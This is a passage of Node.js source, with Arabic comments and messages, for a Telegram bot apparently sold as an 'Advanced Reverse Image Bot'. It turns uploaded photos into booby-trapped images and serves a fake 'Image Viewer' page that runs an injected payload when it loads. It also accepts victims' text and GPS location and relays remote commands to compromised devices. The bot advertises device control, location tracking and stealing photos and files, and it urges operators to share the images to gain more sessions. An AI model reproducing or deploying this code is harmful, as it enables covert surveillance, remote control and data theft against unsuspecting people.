        if (reverseSessions.has(deviceId)) {
          const session = reverseSessions.get(deviceId);
          
          session.socket.emit('command', {
            device_id: deviceId,
            command: command
          });
          
          await appBot.sendMessage(chatId, `✅ تم إرسال الأمر للجهاز: ${command}`);
        } else {
          await appBot.sendMessage(chatId, `❌ الجلسة غير متصلة حالياً`);
        }
        
        infectedImages.delete('pending_command');
      }
    }
  }

  // الأوامر النصية
  if (text === '/start' || text === '/start') {
    await appBot.sendMessage(
      chatId,
      `🎯 بوت الجلسات العكسية المتقدم - الإصدار 4.0.0\n\n` +
      `📊 الإحصائيات الحالية:\n` +
      `• 🔗 الجلسات النشطة: ${reverseSessions.size}\n` +
      `• 🖼️ الصور الملغمة: ${infectedImages.size}\n\n` +
      `✨ الميزات الجديدة:\n` +
      `• 🎯 تحكم كامل في الأجهزة\n` +
      `• 📍 تحديد الموقع الدقيق\n` +
      `• 📳 تشغيل الاهتزاز\n` +
      `• 🖼️ سحب الصور والملفات\n` +
      `• 🔋 معلومات البطارية\n` +
      `• 🛠️ أوامر متقدمة\n\n` +
      `🔧 اختر الإجراء المطلوب:`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "🦠 صنع صورة ملغمة", callback_data: "new_infected" },
              { text: "📱 الجلسات النشطة", callback_data: "active_sessions" }
            ],
            [
              { text: "⚡ الأوامر السريعة", callback_data: "quick_commands" },
              { text: "📊 إحصائيات", callback_data: "system_stats" }
            ]
          ]
        }
      }
    );
  }
  else if (text === '📊 إحصائيات النظام') {
    const stats = {
      reverse_sessions: reverseSessions.size,
      infected_images: infectedImages.size,
      server_uptime: Math.round(process.uptime())
    };
    
    await appBot.sendMessage(
      chatId,
      `📊 إحصائيات النظام\n\n` +
      `🦠 الجلسات العكسية: ${stats.reverse_sessions}\n` +
      `🖼️ الصور الملغمة: ${stats.infected_images}\n` +
      `⏰ مدة التشغيل: ${stats.server_uptime} ثانية\n` +
      `🟢 الحالة: نشط ومستقر\n\n` +
      `🔧 الإصدار: 4.0.0`,
      { parse_mode: "HTML" }
    );
  }
  
  // معالجة استقبال الصور مباشرة
  if (msg.photo && msg.photo.length > 0) {
    const fileId = msg.photo[msg.photo.length - 1].file_id;
    
    try {
      await appBot.sendChatAction(chatId, 'typing');
      
      // تحميل الصورة
      const fileLink = await appBot.getFileLink(fileId);
      const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
      const imageBuffer = Buffer.from(response.data);
      
      const imageId = uuidv4();
      
      // حفظ الصورة مؤقتاً
      infectedImages.set(imageId, {
        imageBuffer: imageBuffer,
        filename: `photo_${imageId}.jpg`,
        timestamp: new Date()
      });
      
      // معالجة الصورة تلقائياً
      await appBot.sendMessage(
        chatId,
        `📸 تم استلام صورتك!\n` +
        `🦠 جاري تلغيم الصورة...`,
        { parse_mode: "HTML" }
      );
      
      await appBot.sendChatAction(chatId, 'upload_photo');
      
      // 🔥 تلغيم الصورة
      const infectedImage = await createInfectedImage(imageBuffer, imageId);
      
      // 🔥 حفظ البايلود
      const payload = createAdvancedReversePayload(imageId);
      infectedImages.set(`payload_${imageId}`, payload.toString('utf8'));
      
      // إرسال الصورة الملغمة
      await appBot.sendDocument(
        chatId,
        infectedImage,
        {
          caption: `🦠 صورة ملغمة جاهزة!\n\n` +
                  `🆔 المعرف: <code>${imageId}</code>\n` +
                  `⏰ الوقت: ${new Date().toLocaleString()}\n\n` +
                  `⚠️ عندما تفتح هذه الصورة:\n` +
                  `• ستفتح جلسة تحكم كاملة تلقائياً\n` +
                  `• يمكنك التحكم في الجهاز عن بعد\n` +
                  `• جميع المخرجات تظهر هنا\n\n` +
                  `🎯 الأوامر المتاحة:\n` +
                  `• معلومات - معلومات كاملة عن الجهاز\n` +
                  `• الموقع - تحديد الموقع الدقيق\n` +
                  `• اهتزاز - تشغيل الاهتزاز\n` +
                  `• البطارية - حالة البطارية\n` +
                  `• الصور - سحب الصور من الجهاز\n` +
                  `• الفورمات - محاكاة فرمتة الجهاز\n` +
                  `• وأوامر متقدمة أخرى...\n\n` +
                  `🔗 شارك هذه الصورة لفتح جلسات جديدة!`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                { text: "🔄 صنع صورة أخرى", callback_data: "new_infected" },
                { text: "📊 الجلسات النشطة", callback_data: "active_sessions" }
              ]
            ]
          }
        },
        {
          filename: `infected_${imageId}.png`,
          contentType: 'image/png'
        }
      );
      
      console.log('✅ تم إرسال الصورة الملغمة تلقائياً');
      
    } catch (error) {
      console.error('❌ خطأ في معالجة الصورة:', error);
      await appBot.sendMessage(
        chatId,
        `❌ حدث خطأ أثناء معالجة الصورة\n\n` +
        `الخطأ: ${error.message}`,
        { parse_mode: "HTML" }
      );
    }
    
    return;
  }
});

// 📤 باقي ال endpoints
app.post("/uploadText", (req, res) => {
  const model = req.headers.model || 'غير معروف';
  const text = req.body.text || 'لا يوجد نص';
  
  appBot.sendMessage(id, `📨 رسالة من <b>${model}</b>\n\n${text}`, { 
    parse_mode: "HTML" 
  });
  
  res.json({ status: 'success' });
});

app.post("/uploadLocation", (req, res) => {
  const model = req.headers.model || 'غير معروف';
  const lat = req.body.lat;
  const lon = req.body.lon;
  
  appBot.sendLocation(id, lat, lon);
  appBot.sendMessage(id, `📍 موقع من <b>${model}</b>`, { 
    parse_mode: "HTML" 
  });
  
  res.json({ status: 'success' });
});

// 🌐 الصفحة الرئيسية
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>🦠 Advanced Reverse Image Bot</title>
        <meta charset="utf-8">
        <style>
            body { 
                font-family: Arial, sans-serif; 
                margin: 40px; 
                background: #0d1117; 
                color: #c9d1d9; 
            }
            .container { 
                max-width: 800px; 
                margin: 0 auto; 
                text-align: center;
            }
            .status { 
                background: #161b22; 
                padding: 20px; 
                border-radius: 10px; 
                margin: 20px 0; 
                border: 1px solid #30363d;
            }
            .feature {
                background: #1c2128;
                padding: 15px;
                margin: 10px 0;
                border-radius: 8px;
                border-right: 4px solid #58a6ff;
            }
            h1 { color: #58a6ff; }
            .btn {
                display: inline-block;
                padding: 10px 20px;
                margin: 10px;
                background: #238636;
                color: white;
                text-decoration: none;
                border-radius: 5px;
                font-weight: bold;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🚀 Advanced Reverse Image Bot</h1>
            <p>الإصدار 4.0.0 - نظام التحكم الكامل عبر الصور</p>
            
            <div class="status">
                <h2>📊 System Status</h2>
                <p>🦠 الجلسات النشطة: ${reverseSessions.size}</p>
                <p>🖼️ الصور الملغمة: ${infectedImages.size}</p>
                <p>⏰ وقت التشغيل: ${Math.round(process.uptime())} ثانية</p>
                <p>🟢 الحالة: <strong>نشط ومستقر</strong></p>
            </div>
            
            <div class="feature">
                <h3>🎯 الميزات الجديدة</h3>
                <p>• تحكم كامل في الأجهزة عن بعد</p>
                <p>• تحديد الموقع الدقيق</p>
                <p>• سحب الصور والملفات</p>
                <p>• تشغيل الاهتزاز</p>
                <p>• معلومات البطارية والنظام</p>
            </div>
            
            <p>Bot is running successfully! 🎯</p>
            <p>Developer: @VIP_MFM</p>
            
            <div style="margin-top: 30px;">
                <a href="https://t.me/VIP_MFM" class="btn">📞 الدعم الفني</a>
                <a href="https://t.me/your_bot" class="btn">🤖 استخدام البوت</a>
            </div>
        </div>
    </body>
    </html>
  `);
});

// 🔗 endpoint لخدمة البايلود
app.get('/payload/:imageId', (req, res) => {
  const imageId = req.params.imageId;
  const payload = infectedImages.get(`payload_${imageId}`);
  
  if (payload) {
    res.send(`
      <!DOCTYPE html>
      <html>
      <head>
          <title>Image Viewer</title>
          <style>
              body { 
                  font-family: Arial, sans-serif; 
                  margin: 0; 
                  padding: 20px; 
                  background: #f0f0f0;
                  text-align: center;
              }
              .container {
                  max-width: 600px;
                  margin: 0 auto;
                  background: white;
                  padding: 20px;
                  border-radius: 10px;
                  box-shadow: 0 2px 10px rgba(0,0,0,0.1);
              }
              img {
                  max-width: 100%;
                  height: auto;
                  border-radius: 8px;
              }
          </style>
      </head>
      <body>
          <div class="container">
              <h2>🖼️ معاينة الصورة</h2>
              <p>جاري تحميل الصورة...</p>
              <div id="image-container"></div>
          </div>
          
          <script>
              // البايلود سيشتغل تلقائياً
              ${payload}
              
              // محاكاة تحميل الصورة
              setTimeout(() => {
                  document.getElementById('image-container').innerHTML = 
                      '<p>✅ تم تحميل الصورة بنجاح</p>' +
                      '<p>📱 جاري الاتصال بالنظام...</p>';
              }, 2000);
          </script>
      </body>
      </html>
    `);
  } else {
    res.status(404).send('Payload not found');
  }
});

// 🚀 بدء السيرفر
const PORT = process.env.PORT || 8999;
appServer.listen(PORT, () => {
  console.log(`✅ البوت شغال على البورت: ${PORT}`);
  console.log(`🎯 نظام الجلسات العكسية المتقدم مفعل`);
  console.log(`🦠 نظام تلغيم الصور جاهز`);
  console.log(`⚡ جاهز لاستقبال الصور وتشغيل الجلسات!`);
});

// معالجة الأخطاء
process.on('unhandledRejection', (error) => {
  console.error('❌ Unhandled Rejection:', error);
});